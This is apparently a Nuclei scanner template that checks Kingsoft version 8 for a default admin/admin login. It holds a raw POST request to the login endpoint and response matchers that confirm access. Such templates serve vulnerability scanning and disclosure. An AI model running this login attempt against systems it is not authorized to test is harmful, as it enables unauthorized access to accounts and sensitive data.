http:
- attack: pitchfork
  host-redirects: true
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - ADMIN
    - userSession
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1

    Host: {{Hostname}}


    {"get_user_login_cmd":{"name":"{{username}}","password":"{{md5(password)}}"}}

    '
id: kingsoft-v8-default-login
info:
  author: ritikchaddha
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: Kingsoft version 8 contains a default login vulnerability. An attacker
    can obtain access to user accounts and access sensitive information, modify data,
    and/or execute unauthorized operations.
  metadata:
    max-request: 1
  name: Kingsoft 8 - Default Login
  reference:
  - https://idc.wanyunshuju.com/aqld/2123.html
  severity: high
  tags: kingsoft,default-login
